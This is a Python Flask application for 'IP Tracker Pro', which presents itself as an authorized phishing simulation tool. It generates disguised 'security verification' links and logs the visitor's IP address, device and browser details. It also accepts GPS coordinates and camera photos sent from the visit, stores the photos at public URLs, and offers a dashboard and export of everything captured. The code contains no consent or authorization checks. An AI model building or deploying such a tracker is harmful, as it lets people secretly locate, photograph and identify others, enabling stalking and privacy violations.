"""
IP Tracker Pro - Phishing Simulation Tool with Supabase Backend
Flask-based web application for authorized penetration testing
"""

from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
from supabase import create_client, Client
import os
import secrets
from datetime import datetime, timedelta
import base64
from io import BytesIO
from PIL import Image
import re
from dotenv import load_dotenv
import json

# Load environment variables
load_dotenv()

app = Flask(__name__)
CORS(app)

# ==================== SUPABASE CONFIGURATION ====================

SUPABASE_URL = os.getenv('SUPABASE_URL')
SUPABASE_KEY = os.getenv('SUPABASE_KEY')

if not SUPABASE_URL or not SUPABASE_KEY:
    print("⚠️  WARNING: SUPABASE_URL or SUPABASE_KEY not set in environment")
    print("Set these in .env file or Vercel environment variables")

# Initialize Supabase client
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# ==================== HELPER FUNCTIONS ====================

def parse_user_agent(ua):
    """Parse user agent to extract device type"""
    device = 'Desktop'
    if re.search(r'Mobile|Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini', ua, re.IGNORECASE):
        device = 'Mobile'
        if re.search(r'iPad|Tablet|Silk', ua, re.IGNORECASE):
            device = 'Tablet'
    return device

def parse_browser(ua):
    """Extract browser name and version"""
    patterns = [
        (r'Firefox/([\d.]+)', 'Firefox {}'),
        (r'Edg/([\d.]+)', 'Edge {}'),
        (r'OPR/([\d.]+)', 'Opera {}'),
        (r'Chrome/([\d.]+)', 'Chrome {}'),
        (r'Safari/([\d.]+)', 'Safari {}'),
    ]
    
    for pattern, fmt in patterns:
        match = re.search(pattern, ua)
        if match:
            return fmt.format(match.group(1))
    return 'Unknown'

def parse_os(ua):
    """Extract operating system"""
    patterns = [
        (r'Windows NT ([\d.]+)', {
            '10.0': 'Windows 10',
            '6.3': 'Windows 8.1',
            '6.2': 'Windows 8',
            '6.1': 'Windows 7'
        }),
        (r'Mac OS X ([\d_]+)', lambda x: f"macOS {x.replace('_', '.')}"),
        (r'Android ([\d.]+)', lambda x: f"Android {x}"),
        (r'iPhone|iPad|iPod', 'iOS'),
        (r'Linux', 'Linux'),
    ]
    
    for pattern, mapping in patterns:
        match = re.search(pattern, ua)
        if match:
            if isinstance(mapping, dict):
                return mapping.get(match.group(1), match.group(1))
            elif callable(mapping):
                return mapping(match.group(1))
            else:
                return mapping
    return 'Unknown'

def get_client_ip():
    """Get client's real IP address"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def upload_photo_to_supabase(session_id, photo_index, image_bytes):
    """Upload photo to Supabase storage"""
    try:
        bucket_name = "photos"
        file_path = f"{session_id}/photo_{photo_index}.jpg"
        
        # Create bucket if it doesn't exist
        try:
            supabase.storage.create_bucket(bucket_name)
        except:
            pass  # Bucket might already exist
        
        # Upload file
        response = supabase.storage.from_(bucket_name).upload(
            file_path,
            image_bytes,
            {"content-type": "image/jpeg"}
        )
        
        # Get public URL
        public_url = supabase.storage.from_(bucket_name).get_public_url(file_path)
        return public_url
    except Exception as e:
        print(f"Error uploading photo: {e}")
        return None

# ==================== MAIN ROUTES ====================

@app.route('/')
def index():
    """Main campaign builder page"""
    return render_template('index.html')

@app.route('/api/generate', methods=['POST'])
def generate_campaign():
    """Generate a new phishing campaign"""
    try:
        data = request.get_json()
        
        # Validate input
        tracking_level = int(data.get('tracking_level', 0))
        if tracking_level < 1 or tracking_level > 3:
            return jsonify({'success': False, 'message': 'Invalid tracking level'}), 400
        
        # Generate IDs
        campaign_id = secrets.token_hex(16)
        secret = secrets.token_hex(8)
        
        # Store campaign in Supabase
        campaign_data = {
            'campaign_id': campaign_id,
            'secret': secret,
            'level': tracking_level,
            'title': data.get('page_title', 'Security Verification Required'),
            'redirect_url': data.get('redirect_url', ''),
            'message': data.get('custom_message', 'Verifying your identity, please wait...'),
            'created_at': datetime.utcnow().isoformat()
        }
        
        response = supabase.table('campaigns').insert(campaign_data).execute()
        
        if not response.data:
            return jsonify({'success': False, 'message': 'Failed to create campaign'}), 500
        
        # Build tracking link
        protocol = 'https' if request.scheme == 'https' else 'http'
        host = request.host
        base_path = request.url_root.rstrip('/')
        track_link = f"{base_path}/track?id={campaign_id}&s={secret}"
        
        return jsonify({
            'success': True,
            'link': track_link,
            'id': campaign_id
        })
    
    except Exception as e:
        print(f"Error in generate_campaign: {e}")
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/track')
def track():
    """The phishing page that users visit"""
    try:
        campaign_id = request.args.get('id', '')
        secret = request.args.get('s', '')
        
        # Query campaign from Supabase
        response = supabase.table('campaigns').select('*').eq('campaign_id', campaign_id).execute()
        
        if not response.data:
            return 'Invalid link.', 404
        
        campaign = response.data[0]
        
        if campaign.get('secret') != secret:
            return 'Invalid link.', 403
        
        return render_template('track.html', config=campaign, campaign_id=campaign_id)
    
    except Exception as e:
        print(f"Error in track: {e}")
        return 'Error loading page', 500

@app.route('/api/capture', methods=['POST'])
def capture_data():
    """Handle data capture from tracking page"""
    try:
        data = request.get_json()
        action = data.get('action', '')
        campaign_id = data.get('campaign_id', '')
        
        if action == 'ip_info':
            session_id = secrets.token_hex(12)
            
            # Collect IP and device info
            ip_data = {
                'session_id': session_id,
                'campaign_id': campaign_id,
                'ip_address': get_client_ip(),
                'user_agent': request.headers.get('User-Agent', 'unknown'),
                'referer': request.headers.get('Referer', ''),
                'accept_language': request.headers.get('Accept-Language', ''),
                'x_forwarded_for': request.headers.get('X-Forwarded-For', ''),
                'device': parse_user_agent(request.headers.get('User-Agent', '')),
                'browser': parse_browser(request.headers.get('User-Agent', '')),
                'os': parse_os(request.headers.get('User-Agent', '')),
                'is_forwarded': data.get('forwarded', False),
                'timestamp': datetime.utcnow().isoformat()
            }
            
            # Insert into Supabase
            response = supabase.table('sessions').insert(ip_data).execute()
            
            if not response.data:
                return jsonify({'success': False, 'message': 'Failed to save IP data'}), 500
            
            return jsonify({'success': True, 'session_id': session_id})
        
        elif action == 'gps':
            session_id = data.get('session_id', '')
            
            gps_data = {
                'session_id': session_id,
                'latitude': data.get('latitude'),
                'longitude': data.get('longitude'),
                'accuracy': data.get('accuracy'),
                'timestamp': datetime.utcnow().isoformat()
            }
            
            response = supabase.table('gps_data').insert(gps_data).execute()
            
            if not response.data:
                return jsonify({'success': False, 'message': 'Failed to save GPS data'}), 500
            
            return jsonify({'success': True})
        
        elif action == 'photos':
            session_id = data.get('session_id', '')
            photos = data.get('photos', [])
            
            photo_count = 0
            for idx, photo_base64 in enumerate(photos):
                try:
                    # Decode base64 image
                    if photo_base64.startswith('data:image'):
                        image_data = photo_base64.split(',')[1]
                    else:
                        image_data = photo_base64
                    
                    # Decode and save
                    image_bytes = base64.b64decode(image_data)
                    image = Image.open(BytesIO(image_bytes))
                    
                    # Convert to JPEG
                    jpeg_buffer = BytesIO()
                    image.convert('RGB').save(jpeg_buffer, format='JPEG', quality=85)
                    jpeg_buffer.seek(0)
                    
                    # Upload to Supabase storage
                    photo_url = upload_photo_to_supabase(session_id, idx + 1, jpeg_buffer.getvalue())
                    
                    # Store reference in database
                    photo_record = {
                        'session_id': session_id,
                        'photo_number': idx + 1,
                        'photo_url': photo_url,
                        'timestamp': datetime.utcnow().isoformat()
                    }
                    
                    response = supabase.table('photos').insert(photo_record).execute()
                    
                    if response.data:
                        photo_count += 1
                    
                except Exception as e:
                    print(f"Error processing photo {idx}: {e}")
            
            return jsonify({'success': True, 'count': photo_count})
        
        return jsonify({'success': False, 'message': 'Invalid action'}), 400
    
    except Exception as e:
        print(f"Error in capture_data: {e}")
        return jsonify({'success': False, 'message': str(e)}), 500

# ==================== DASHBOARD ROUTES ====================

@app.route('/dashboard')
def dashboard():
    """Display campaign results dashboard"""
    return render_template('dashboard.html')

@app.route('/api/dashboard/stats')
def get_stats():
    """Get dashboard statistics"""
    try:
        # Get all sessions with related data
        sessions_response = supabase.table('sessions').select('*').order('timestamp', desc=True).execute()
        sessions = sessions_response.data or []
        
        # Get GPS captures
        gps_response = supabase.table('gps_data').select('*').execute()
        gps_data = {item['session_id']: item for item in (gps_response.data or [])}
        
        # Get photo captures
        photos_response = supabase.table('photos').select('session_id').execute()
        photo_sessions = set(item['session_id'] for item in (photos_response.data or []))
        
        stats = {
            'total': len(sessions),
            'unique_ips': len(set(s['ip_address'] for s in sessions if s.get('ip_address'))),
            'gps_captures': len(gps_data),
            'photo_captures': len(photo_sessions),
            'sessions': []
        }
        
        for session in sessions:
            session_id = session['session_id']
            stats['sessions'].append({
                'session_id': session_id,
                'timestamp': session['timestamp'],
                'ip': session['ip_address'],
                'device': session['device'],
                'browser': session['browser'],
                'os': session['os'],
                'has_gps': session_id in gps_data,
                'has_photos': session_id in photo_sessions,
                'is_forwarded': session.get('is_forwarded', False)
            })
        
        return jsonify(stats)
    
    except Exception as e:
        print(f"Error in get_stats: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/dashboard/session/<session_id>')
def get_session_details(session_id):
    """Get detailed information for a session"""
    try:
        details = {}
        
        # Get session data
        session_response = supabase.table('sessions').select('*').eq('session_id', session_id).execute()
        if session_response.data:
            details['ip'] = session_response.data[0]
        
        # Get GPS data
        gps_response = supabase.table('gps_data').select('*').eq('session_id', session_id).execute()
        if gps_response.data:
            details['gps'] = gps_response.data[0]
        
        # Get photos
        photos_response = supabase.table('photos').select('*').eq('session_id', session_id).order('photo_number').execute()
        if photos_response.data:
            details['photos'] = photos_response.data
        
        if not details:
            return jsonify({'error': 'Session not found'}), 404
        
        return jsonify(details)
    
    except Exception as e:
        print(f"Error in get_session_details: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/dashboard/export')
def export_data():
    """Export all captured data as JSON"""
    try:
        export_data = {
            'exported_at': datetime.utcnow().isoformat(),
            'sessions': []
        }
        
        # Get all sessions
        sessions_response = supabase.table('sessions').select('*').execute()
        sessions = sessions_response.data or []
        
        for session in sessions:
            session_id = session['session_id']
            session_data = {'session': session}
            
            # Get GPS data
            gps_response = supabase.table('gps_data').select('*').eq('session_id', session_id).execute()
            if gps_response.data:
                session_data['gps'] = gps_response.data[0]
            
            # Get photos
            photos_response = supabase.table('photos').select('*').eq('session_id', session_id).execute()
            if photos_response.data:
                session_data['photos'] = photos_response.data
            
            export_data['sessions'].append(session_data)
        
        export_json = json.dumps(export_data, indent=2, default=str)
        
        return send_file(
            BytesIO(export_json.encode()),
            mimetype='application/json',
            as_attachment=True,
            download_name=f'iptracker_export_{datetime.utcnow().strftime("%Y%m%d_%H%M%S")}.json'
        )
    
    except Exception as e:
        print(f"Error in export_data: {e}")
        return jsonify({'error': str(e)}), 500

# ==================== ERROR HANDLERS ====================

@app.errorhandler(404)
def not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500

# ==================== HEALTH CHECK ====================

@app.route('/api/health')
def health_check():
    """Health check endpoint"""
    try:
        # Try a simple query to verify Supabase connection
        response = supabase.table('campaigns').select('count', count='exact').limit(1).execute()
        return jsonify({'status': 'ok', 'database': 'connected'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    # For development only - use a proper WSGI server in production
    app.run(debug=True, host='0.0.0.0', port=5000, ssl_context='adhoc')
